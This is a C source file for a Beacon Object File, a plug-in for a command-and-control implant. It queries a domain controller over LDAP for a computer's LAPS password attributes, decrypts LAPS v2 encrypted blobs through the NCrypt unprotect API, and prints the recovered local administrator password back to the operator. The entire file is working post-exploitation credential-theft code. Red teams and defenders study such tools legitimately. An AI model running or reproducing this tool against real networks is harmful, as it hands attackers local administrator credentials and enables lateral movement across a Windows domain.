// Reference: https://github.com/xpn/RandomTSScripts/blob/master/lapsv2decrypt/bof/lapsv2decrypt.cpp

#include <windows.h>
#include <ncrypt.h>
#include <winldap.h>
#include <winber.h>
#define DYNAMIC_LIB_COUNT 2

#include "base.c"

#ifndef NCRYPT_SILENT_FLAG
#define NCRYPT_SILENT_FLAG 0x00000040
#endif

typedef ULONG_PTR NCRYPT_STREAM_HANDLE;

typedef SECURITY_STATUS (WINAPI *PFNCryptStreamOutputCallback)(
    void *pvCallbackCtxt,
    const BYTE *pbData,
    SIZE_T cbData,
    BOOL fFinal);

typedef struct NCRYPT_PROTECT_STREAM_INFO {
    PFNCryptStreamOutputCallback pfnStreamOutput;
    void *pvCallbackCtxt;
} NCRYPT_PROTECT_STREAM_INFO;

// WLDAP32 function pointers
typedef LDAP *LDAPAPI (*ldap_initA_t)(PSTR HostName, ULONG PortNumber);
typedef ULONG LDAPAPI (*ldap_bind_sA_t)(LDAP *ld, const PSTR dn, const PCHAR cred, ULONG method);
typedef ULONG LDAPAPI (*ldap_unbind_t)(LDAP *ld);
typedef ULONG LDAPAPI (*ldap_search_s_t)(LDAP *ld, const PSTR base, ULONG scope, const PSTR filter, PCHAR attrs[], ULONG attrsonly, LDAPMessage **res);
typedef ULONG LDAPAPI (*ldap_count_entries_t)(LDAP *ld, LDAPMessage *res);
typedef LDAPMessage* LDAPAPI (*ldap_first_entry_t)(LDAP *ld, LDAPMessage *res);
typedef struct berval **LDAPAPI (*ldap_get_values_lenA_t)(LDAP *ld, LDAPMessage *entry, const PCHAR attr);
typedef ULONG LDAPAPI (*ldap_value_free_len_t)(struct berval **vals);
typedef ULONG LDAPAPI (*ldap_msgfree_t)(LDAPMessage *res);

#define WLDAP32$ldap_initA ((ldap_initA_t)DynamicLoad("WLDAP32", "ldap_initA"))
#define WLDAP32$ldap_bind_sA ((ldap_bind_sA_t)DynamicLoad("WLDAP32", "ldap_bind_sA"))
#define WLDAP32$ldap_unbind ((ldap_unbind_t)DynamicLoad("WLDAP32", "ldap_unbind"))
#define WLDAP32$ldap_search_s ((ldap_search_s_t)DynamicLoad("WLDAP32", "ldap_search_s"))
#define WLDAP32$ldap_count_entries ((ldap_count_entries_t)DynamicLoad("WLDAP32", "ldap_count_entries"))
#define WLDAP32$ldap_first_entry ((ldap_first_entry_t)DynamicLoad("WLDAP32", "ldap_first_entry"))
#define WLDAP32$ldap_get_values_lenA ((ldap_get_values_lenA_t)DynamicLoad("WLDAP32", "ldap_get_values_lenA"))
#define WLDAP32$ldap_value_free_len ((ldap_value_free_len_t)DynamicLoad("WLDAP32", "ldap_value_free_len"))
#define WLDAP32$ldap_msgfree ((ldap_msgfree_t)DynamicLoad("WLDAP32", "ldap_msgfree"))

// NCRYPT function pointers
typedef SECURITY_STATUS (WINAPI *NCryptStreamOpenToUnprotect_t)(
    NCRYPT_PROTECT_STREAM_INFO *pStreamInfo,
    DWORD dwFlags,
    HWND hWnd,
    NCRYPT_STREAM_HANDLE *phStream);

typedef SECURITY_STATUS (WINAPI *NCryptStreamUpdate_t)(
    NCRYPT_STREAM_HANDLE hStream,
    const BYTE *pbData,
    SIZE_T cbData,
    BOOL fFinal);

typedef SECURITY_STATUS (WINAPI *NCryptStreamClose_t)(
    NCRYPT_STREAM_HANDLE hStream);

#define NCRYPT$NCryptStreamOpenToUnprotect ((NCryptStreamOpenToUnprotect_t)DynamicLoad("NCRYPT", "NCryptStreamOpenToUnprotect"))
#define NCRYPT$NCryptStreamUpdate ((NCryptStreamUpdate_t)DynamicLoad("NCRYPT", "NCryptStreamUpdate"))
#define NCRYPT$NCryptStreamClose ((NCryptStreamClose_t)DynamicLoad("NCRYPT", "NCryptStreamClose"))

// Blob header structure
struct blob_header {
    unsigned int upperdate;
    unsigned int lowerdate;
    unsigned int encryptedBufferSize;
    unsigned int flags;
};


// LDAP search function - returns TRUE if found, sets isEncrypted flag
BOOL searchLdap(PSTR ldapServer, ULONG port, PCHAR rootDN, PCHAR searchFilter, char **output, int* length, BOOL* isEncrypted) {
    LDAP *ldapHandle = NULL;
    PLDAPMessage searchResult = NULL;
    PCHAR attr[] = { "msLAPS-EncryptedPassword", "ms-Mcs-AdmPwd", NULL };
    ULONG entryCount;
    PLDAPMessage firstEntry = NULL;
    struct berval** outval = NULL;
    ULONG result;

    *isEncrypted = TRUE; // Default to encrypted (LAPS v2)

    ldapHandle = WLDAP32$ldap_initA(ldapServer, port);
    if (ldapHandle == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Error Initialising LDAP connection: ldap_initA");
        return FALSE;
    }

    result = WLDAP32$ldap_bind_sA(ldapHandle, rootDN, NULL, LDAP_AUTH_NEGOTIATE);
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Error binding to LDAP server (code: 0x%x). Try using a hostname instead of IP address.", result);
        WLDAP32$ldap_unbind(ldapHandle);
        return FALSE;
    }

    result = WLDAP32$ldap_search_s(ldapHandle, rootDN, LDAP_SCOPE_SUBTREE, searchFilter, attr, 0, &searchResult);
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LDAP search failed (code: 0x%x)", result);
        if (searchResult != NULL)
            WLDAP32$ldap_msgfree(searchResult);
        WLDAP32$ldap_unbind(ldapHandle);
        return FALSE;
    }

    entryCount = WLDAP32$ldap_count_entries(ldapHandle, searchResult);
    if (entryCount == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] 0 results found from LDAP");
        if (searchResult != NULL)
            WLDAP32$ldap_msgfree(searchResult);
        WLDAP32$ldap_unbind(ldapHandle);
        return FALSE;
    }

    firstEntry = WLDAP32$ldap_first_entry(ldapHandle, searchResult);
    if (firstEntry == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Error getting first LDAP entry");
        if (searchResult != NULL)
            WLDAP32$ldap_msgfree(searchResult);
        WLDAP32$ldap_unbind(ldapHandle);
        return FALSE;
    }

    // Try LAPS v2 attribute first
    outval = WLDAP32$ldap_get_values_lenA(ldapHandle, firstEntry, attr[0]);
    if (outval == NULL) {
        // Try legacy LAPS attribute
        outval = WLDAP32$ldap_get_values_lenA(ldapHandle, firstEntry, attr[1]);
        if (outval == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Computer found but no LAPS password attribute present");
            if (searchResult != NULL)
                WLDAP32$ldap_msgfree(searchResult);
            WLDAP32$ldap_unbind(ldapHandle);
            return FALSE;
        }
        *isEncrypted = FALSE; // Legacy LAPS is plaintext
        BeaconPrintf(CALLBACK_OUTPUT, "[!] This appears to be legacy LAPS (not v2). Password is not encrypted.");
    }

    // Copy the output data before cleaning up LDAP resources
    *length = outval[0]->bv_len;
    *output = (char*)intAlloc(*length + 1);
    if (*output == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed");
        WLDAP32$ldap_value_free_len(outval);
        if (searchResult != NULL)
            WLDAP32$ldap_msgfree(searchResult);
        WLDAP32$ldap_unbind(ldapHandle);
        return FALSE;
    }
    MSVCRT$memcpy(*output, outval[0]->bv_val, *length);
    (*output)[*length] = '\0'; // Null terminate for safety

    // Clean up LDAP resources
    WLDAP32$ldap_value_free_len(outval);
    if (searchResult != NULL)
        WLDAP32$ldap_msgfree(searchResult);
    WLDAP32$ldap_unbind(ldapHandle);

    return TRUE;
}

// Decryption callback
SECURITY_STATUS WINAPI decryptCallback(
    void* pvCallbackCtxt,
    const BYTE* pbData,
    SIZE_T cbData,
    BOOL isFinal) {

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Decrypted Output: %ls", pbData);
    return 0;
}

// Unprotect secret function
BOOL unprotectSecret(BYTE* protectedData, ULONG protectedDataLength) {
    SECURITY_STATUS error;
    NCRYPT_PROTECT_STREAM_INFO streamInfo;
    NCRYPT_STREAM_HANDLE streamHandle;


    streamInfo.pfnStreamOutput = decryptCallback;
    streamInfo.pvCallbackCtxt = NULL;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Decrypting secret...");

    if ((error = NCRYPT$NCryptStreamOpenToUnprotect(&streamInfo, NCRYPT_SILENT_FLAG, 0, &streamHandle)) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] NCryptStreamOpenToUnprotect error: %x", error);
        return FALSE;
    }

    if ((error = NCRYPT$NCryptStreamUpdate(streamHandle, protectedData + 16, protectedDataLength - 16, TRUE)) != 0) {
        NCRYPT$NCryptStreamClose(streamHandle);
        BeaconPrintf(CALLBACK_ERROR, "[!] NCryptStreamUpdate error: %x", error);
        return FALSE;
    }

    NCRYPT$NCryptStreamClose(streamHandle);
    return TRUE;
}

void go(char* args, int len) {
    unsigned char* output = NULL;
    int length = 0;
    struct blob_header* header = NULL;
    datap parser;

    char* domainController = NULL;
    char* rootDN = NULL;
    char* searchFilter = NULL;
    int stringSize = 0;
    BOOL isEncrypted = TRUE;


    // Parse arguments
    BeaconDataParse(&parser, args, len);

    domainController = BeaconDataExtract(&parser, NULL);
    if (!domainController || domainController[0] == '\0') {
        BeaconPrintf(CALLBACK_ERROR, "[!] Domain controller is required");
        return;
    }

    rootDN = BeaconDataExtract(&parser, NULL);
    if (!rootDN || rootDN[0] == '\0') {
        BeaconPrintf(CALLBACK_ERROR, "[!] Root DN is required");
        return;
    }

    searchFilter = BeaconDataExtract(&parser, &stringSize);
    if (!searchFilter || searchFilter[0] == '\0' || stringSize == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Search filter is required");
        return;
    }

    if (!searchLdap(domainController, 389, rootDN, searchFilter, (char**)&output, &length, &isEncrypted)) {
        return;
    }

    // If legacy LAPS just print the password
    if (!isEncrypted) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Legacy LAPS Password: %s", (char*)output);
        intFree(output); // Clean up allocated memory
        return;
    }

    // Otherwise it's LAPS v2, parse header and decrypt
    header = (struct blob_header*)output;

    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] LAPSv2 Blob Header Info:");
    BeaconPrintf(CALLBACK_OUTPUT, "    Upper Date Timestamp: %d", header->upperdate);
    BeaconPrintf(CALLBACK_OUTPUT, "    Lower Date Timestamp: %d", header->lowerdate);
    BeaconPrintf(CALLBACK_OUTPUT, "    Encrypted Buffer Size: %d", header->encryptedBufferSize);
    BeaconPrintf(CALLBACK_OUTPUT, "    Flags: %d\n", header->flags);

    if (header->encryptedBufferSize != length - sizeof(struct blob_header)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Header Length (%d) and LDAP Returned Length (%d) Don't Match.. decryption may fail",
                       header->encryptedBufferSize, length - sizeof(struct blob_header));
    }

    if (!unprotectSecret((BYTE*)output, length)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not unprotect LAPS creds");
        intFree(output);
        return;
    }

    intFree(output);
}
